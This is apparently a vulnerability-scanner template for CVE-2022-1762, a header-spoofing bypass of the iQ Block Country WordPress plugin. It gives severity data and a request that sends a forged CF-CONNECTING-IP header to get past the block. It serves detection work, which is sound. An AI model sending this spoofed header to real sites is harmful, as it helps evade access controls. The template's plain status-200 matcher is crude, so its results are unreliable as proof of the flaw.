id: CVE-2022-1762

info:
  name: iQ Block Country IP Spoofing Bypass
  author: ProjectDiscoveryAI
  severity: high
  description: The iQ Block Country WordPress plugin before 1.2.20 does not properly check HTTP headers to validate the origin IP address, allowing threat actors to bypass its block feature by spoofing the headers.
  impact: |
    Successful exploitation could lead to unauthorized access or bypassing of security controls.
  remediation: |
    Apply the vendor-supplied patch or update to mitigate the vulnerability.
  reference:
    - https://wpscan.com/vulnerability/03254977-37cc-4365-979b-326f9637be85
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-1762
    epss-score: 0.00078
    epss-percentile: 0.35454
    cpe: cpe:2.3:a:webence:iq_block_country:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: webence
    product: iq_block_country
    framework: wordpress
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      CF-CONNECTING-IP: "0.0.0.0"
    matchers:
      - type: status
        status:
          - 200
